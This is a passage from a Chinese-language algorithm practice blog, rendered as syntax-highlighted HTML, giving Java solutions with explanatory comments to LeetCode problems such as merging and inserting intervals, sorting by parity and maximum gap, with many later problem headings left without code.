class="keyword">int</span>[]&gt;()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span>[] b)</span></span>&#123;</span><br><span class="line">                <span class="keyword">return</span> a[<span class="number">0</span>] - b[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        List&lt;<span class="keyword">int</span>[]&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span>[] cur = intervals[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; intervals.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(intervals[i][<span class="number">0</span>] &gt; cur[<span class="number">1</span>])&#123;</span><br><span class="line">                res.add(cur);</span><br><span class="line">                cur = intervals[i];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur[<span class="number">1</span>]  = Math.max(cur[<span class="number">1</span>], intervals[i][<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(cur);</span><br><span class="line">        <span class="keyword">int</span>[][] ans = <span class="keyword">new</span> <span class="keyword">int</span>[res.size()][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.size(); i++)&#123;</span><br><span class="line">            ans[i] = res.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-插入区间"><a href="#15-插入区间" class="headerlink" title="15. 插入区间"></a>15. 插入区间</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] insert(<span class="keyword">int</span>[][] intervals, <span class="keyword">int</span>[] newInterval) &#123;</span><br><span class="line">        List&lt;<span class="keyword">int</span>[]&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;<span class="comment">//用于遍历所有区间</span></span><br><span class="line">        <span class="comment">//将区间结束小于新区间开始的区间放入到结果集里面</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; intervals.length &amp;&amp; intervals[i][<span class="number">1</span>] &lt; newInterval[<span class="number">0</span>])&#123;</span><br><span class="line">            res.add(intervals[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将区间开始小于等于新区间结束的区间和新区间合并</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; intervals.length &amp;&amp; intervals[i][<span class="number">0</span>] &lt;= newInterval[<span class="number">1</span>])&#123;</span><br><span class="line">            newInterval[<span class="number">0</span>] = Math.min(intervals[i][<span class="number">0</span>], newInterval[<span class="number">0</span>]);</span><br><span class="line">            newInterval[<span class="number">1</span>] = Math.max(intervals[i][<span class="number">1</span>], newInterval[<span class="number">1</span>]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//将合并的区间放入结果集</span></span><br><span class="line">        res.add(newInterval);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将剩余的区间放入到结果集</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; intervals.length)&#123;</span><br><span class="line">            res.add(intervals[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toArray(<span class="keyword">new</span> <span class="keyword">int</span>[res.size()][]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-按奇偶排序数组"><a href="#16-按奇偶排序数组" class="headerlink" title="16. 按奇偶排序数组"></a>16. 按奇偶排序数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//法一：左右指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                ans[left] = nums[i];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans[right] = nums[i];</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//法二 排序 升序排序 比法一还差</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity3(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">     <span class="keyword">int</span> n = A.length;</span><br><span class="line">     Integer[] tmp = <span class="keyword">new</span> Integer[n];</span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) tmp[i] = A[i];</span><br><span class="line"><span class="comment">//自定义排序 0-1 = -1 所以偶数在前</span></span><br><span class="line">     Arrays.sort(tmp, (o1, o2) -&gt; o1 % <span class="number">2</span> - o2 % <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) A[i] = tmp[i];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> A;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//法三 快排的二向切分 只是分区条件不一样 O(n) O(1)</span></span><br><span class="line"><span class="comment">// 快排分区的逻辑</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity4(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">    <span class="keyword">int</span> less = <span class="number">0</span>, great = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; great &lt; A.length ; great++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[less] % <span class="number">2</span> &gt; A[great] % <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = A[less];</span><br><span class="line">            A[less] = A[great];</span><br><span class="line">            A[great] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (A[less] % <span class="number">2</span> == <span class="number">0</span>) less++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// 快排分区的逻辑优化 对撞指针</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">    <span class="keyword">int</span> less = <span class="number">0</span>, great = A.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (less &lt; great)&#123;</span><br><span class="line">        <span class="keyword">if</span> (A[less] % <span class="number">2</span> &gt; A[great] % <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = A[less];</span><br><span class="line">            A[less] = A[great];</span><br><span class="line">            A[great] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (A[less] % <span class="number">2</span> == <span class="number">0</span>) less++;</span><br><span class="line">        <span class="keyword">if</span> (A[great] % <span class="number">2</span> == <span class="number">1</span>) great--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> A;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-按奇偶排序数组二"><a href="#17-按奇偶排序数组二" class="headerlink" title="17. 按奇偶排序数组二"></a>17. 按奇偶排序数组二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParityII(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(i &lt; n)&#123;</span><br><span class="line">            <span class="comment">//如果当前偶数位置是奇数元素</span></span><br><span class="line">            <span class="keyword">if</span>(nums[i] % <span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//那么在奇数位置上找到一个偶数，与之交换</span></span><br><span class="line">                <span class="keyword">while</span>(nums[j] % <span class="number">2</span> == <span class="number">1</span>) j += <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> tmp = nums[i];</span><br><span class="line">                nums[i] = nums[j];</span><br><span class="line">                nums[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            i += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="18-有多少小于当前数字的数字"><a href="#18-有多少小于当前数字的数字" class="headerlink" title="18. 有多少小于当前数字的数字"></a>18. 有多少小于当前数字的数字</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//排序后再统计</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="comment">// 维护元素值 -&gt; 索引关系</span></span><br><span class="line">        <span class="keyword">int</span>[][] data = <span class="keyword">new</span> <span class="keyword">int</span>[n][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            data[i][<span class="number">0</span>] = nums[i];</span><br><span class="line">            <span class="comment">// bug 修复：第二个值存储索引</span></span><br><span class="line">            data[i][<span class="number">1</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按照元素值升序排序</span></span><br><span class="line">        Arrays.sort(data, (o1, o2) -&gt; o1[<span class="number">0</span>] - o2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">int</span> prev = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev == -<span class="number">1</span> || data[i][<span class="number">0</span>] != data[i - <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">                prev = i;</span><br><span class="line">            &#125;</span><br><span class="line">            ans[data[i][<span class="number">1</span>]] = prev;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//级数 主要是因为数据量不大，最大值也就100，那就可以让数字充当下标</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] smallerNumbersThanCurrent(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[] cnt = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            cnt[num]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt; <span class="number">101</span>; i++)&#123;</span><br><span class="line">            cnt[i] += cnt[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            res[i] = nums[i] == <span class="number">0</span> ? <span class="number">0</span> : cnt[nums[i] - <span class="number">1</span>];</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="19-最大间距"><a href="#19-最大间距" class="headerlink" title="19. 最大间距"></a>19. 最大间距</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//桶排序</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 桶排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maximumGap</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="keyword">null</span> || nums.length &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 1. 找到最大最小值</span></span><br><span class="line">        <span class="keyword">int</span> min = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> max = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            min = Math.min(min, num);</span><br><span class="line">            max = Math.max(max, num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (max == min) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> gap = (<span class="keyword">int</span>)Math.ceil((<span class="keyword">double</span>)(max - min)/(nums.length - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 初始化桶数组</span></span><br><span class="line">        <span class="keyword">int</span> bucketNum = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[][] buckets = <span class="keyword">new</span> <span class="keyword">int</span>[bucketNum][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bucketNum; i++) &#123;</span><br><span class="line">            buckets[i][<span class="number">0</span>] = Integer.MAX_VALUE;</span><br><span class="line">            buckets[i][<span class="number">1</span>] = Integer.MIN_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 将所有元素添加到对应的桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            <span class="comment">// bucketId 计算逻辑如何理解，请参考 issue：https://gitee.com/douma_edu/douma_algo_training_camp/issues/I498BD</span></span><br><span class="line">            <span class="keyword">int</span> bucketId = (num - min) / gap;</span><br><span class="line">            buckets[bucketId][<span class="number">0</span>] = Math.min(buckets[bucketId][<span class="number">0</span>], num);</span><br><span class="line">            buckets[bucketId][<span class="number">1</span>]= Math.max(buckets[bucketId][<span class="number">1</span>], num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 计算最大间隔</span></span><br><span class="line">        <span class="keyword">int</span> maxGap = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prevBucketMax = min;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span>[] bucket : buckets) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bucket[<span class="number">0</span>] == Integer.MAX_VALUE) <span class="keyword">continue</span>;</span><br><span class="line">            maxGap = Math.max(maxGap, bucket[<span class="number">0</span>] - prevBucketMax);</span><br><span class="line">            prevBucketMax = bucket[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> maxGap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//TODO 基数排序</span></span><br></pre></td></tr></table></figure><h2 id="刷题第八天"><a href="#刷题第八天" class="headerlink" title="刷题第八天"></a>刷题第八天</h2><p>二分查找</p><h2 id="刷题第九天"><a href="#刷题第九天" class="headerlink" title="刷题第九天"></a>刷题第九天</h2><h3 id="1-宝石与石头"><a href="#1-宝石与石头" class="headerlink" title="1. 宝石与石头"></a>1. 宝石与石头</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 哈希查找</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 时间复杂度：O(n)</span></span><br><span class="line">    <span class="comment">// 空间复杂度：O(m)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones2</span><span class="params">(String jewels, String stones)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : jewels.toCharArray()) set.add(c);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : stones.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (set.contains(c)) ans++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 哈希查找</span></span><br><span class="line">    <span class="comment">// 时间复杂度：O(n)</span></span><br><span class="line">    <span class="comment">// 空间复杂度：O(1)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(String jewels, String stones)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">58</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : jewels.toCharArray()) count[c - <span class="string">'A'</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : stones.toCharArray()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (count[c - <span class="string">'A'</span>] == <span class="number">1</span>) ans++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-公平的糖果棒交换"><a href="#2-公平的糖果棒交换" class="headerlink" title="2. 公平的糖果棒交换"></a>2. 公平的糖果棒交换</h3><h3 id="3-最长连续序列"><a href="#3-最长连续序列" class="headerlink" title="3. 最长连续序列"></a>3. 最长连续序列</h3><h3 id="4-只出现一次的数字"><a href="#4-只出现一次的数字" class="headerlink" title="4. 只出现一次的数字"></a>4. 只出现一次的数字</h3><h3 id="5-找不同"><a href="#5-找不同" class="headerlink" title="5. 找不同"></a>5. 找不同</h3><h3 id="6-砖墙"><a href="#6-砖墙" class="headerlink" title="6. 砖墙"></a>6. 砖墙</h3><h3 id="7-同构字符串"><a href="#7-同构字符串" class="headerlink" title="7. 同构字符串"></a>7. 同构字符串</h3><h3 id="8-单词规律"><a href="#8-单词规律" class="headerlink" title="8. 单词规律"></a>8. 单词规律</h3><h3 id="9-有效的字母异位词"><a href="#9-有效的字母异位词" class="headerlink" title="9. 有效的字母异位词"></a>9. 有效的字母异位词</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAnagram2</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s.length() != t.length()) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 1. 统计字符串 s 中每个字符出现的次数</span></span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : s.toCharArray()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">            map.put(c, map.get(c) + <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            map.put(c, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 减去字符串 t 中字符出现的次数，如果出现的次数出现小于 0 的话，则返回 false</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : t.toCharArray()) &#123;</span><br><span class="line">        map.put(c, map.getOrDefault(c, <span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (map.get(c) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-字母异位词分组"><a href="#10-字母异位词分组" class="headerlink" title="10. 字母异位词分组"></a>10. 字母异位词分组</h3><h3 id="11-和为K的子数组"><a href="#11-和为K的子数组" class="headerlink" title="11. 和为K的子数组"></a>11. 和为K的子数组</h3><h3 id="12-缺失的第一个正数"><a href="#12-缺失的第一个正数" class="headerlink" title="12. 缺失的第一个正数"></a>12. 缺失的第一个正数</h3><h3 id="13-数组的相对排序"><a href="#13-数组的相对排序" class="headerlink" title="13. 数组的相对排序"></a>13. 数组的相对排序</h3><h2 id="刷题第十天"><a href="#刷题第十天" class="headerlink" title="刷题第十天"></a>刷题第十天</h2><h3 id="1-有效的括号"><a href="#1-有效的括号" class="headerlink" title="1. 有效的括号"></a>1. 有效的括号</h3><h3 id="2-简化路径"><a href="#2-简化路径" class="headerlink" title="2. 简化路径"></a>2. 简化路径</h3><h3 id="3-字符串解码"><a href="#3-字符串解码" class="headerlink" title="3. 字符串解码"></a>3. 字符串解码</h3><h3 id="4-基本计算器"><a href="#4-基本计算器" class="headerlink" title="4. 基本计算器"></a>4. 基本计算器</h3><h3 id="5-基本计算器二"><a href="#5-基本计算器二" class="headerlink" title="5. 基本计算器二"></a>5. 基本计算器二</h3><h3 id="6-验证栈序列"><a href="#6-验证栈序列" class="headerlink" title="6. 验证栈序列"></a>6. 验证栈序列</h3><h3 id="7-单调栈"><a href="#7-单调栈" class="headerlink" title="7. 单调栈"></a>7. 单调栈</h3><h3 id="8-每日温度"><a href="#8-每日温度" class="headerlink" title="8. 每日温度"></a>8. 每日温度</h3><h3 id="9-接雨水"><a href="#9-接雨水" class="headerlink" title="9. 接雨水"></a>9. 接雨水</h3><h3 id="10-柱状图中最大的矩形"><a href="#10-柱状图中最大的矩形" class="headerlink" title="10. 柱状图中最大的矩形"></a>10. 柱状图中最大的矩形</h3><h3 id="11-最大矩形"><a href="#11-最大矩形" class="headerlink" title="11. 最大矩形"></a>11. 最大矩形</h3><h3 id="12-拼接最大数"><a 